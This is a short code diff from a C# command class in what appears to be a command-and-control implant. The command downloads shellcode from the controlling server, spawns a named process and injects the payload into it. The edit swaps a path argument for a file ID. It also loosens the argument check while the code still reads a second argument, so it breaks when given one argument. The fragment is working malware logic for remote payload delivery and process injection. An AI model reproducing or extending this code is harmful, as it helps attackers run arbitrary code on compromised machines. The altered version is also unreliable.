@@ -16,22 +16,22 @@ namespace Agent.Commands
 
         public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
         {
-            if (task.SplittedArgs.Length < 2)
+            if (task.SplittedArgs.Length < 1)
             {
-                result.Result = $"Usage: {this.Name} Path_Of_ShellCode_On_Server  Process_Name_To_Start";
+                result.Result = $"Usage: {this.Name}  Process_Name_To_Start";
                 return;
             }
 
-            var fileName = task.SplittedArgs[0];
-            var fileContent = commm.Download(fileName, a =>
+            var fileName = task.FileId;
+            var fileContent = commm.Download(task.FileId, a =>
             {
                 result.Info = $"Downloading {fileName} ({a}%)";
                 commm.SendResult(result);
             }).Result;
 
-            var shellcode = fileContent;
-
             this.Notify(result, commm, $"{fileName} Downloaded");
+
+            var shellcode = fileContent;
 
             var injectRes =  Injector.SpawnInjectWithOutput(fileContent, task.SplittedArgs[1]);
             if(!injectRes.Succeed)
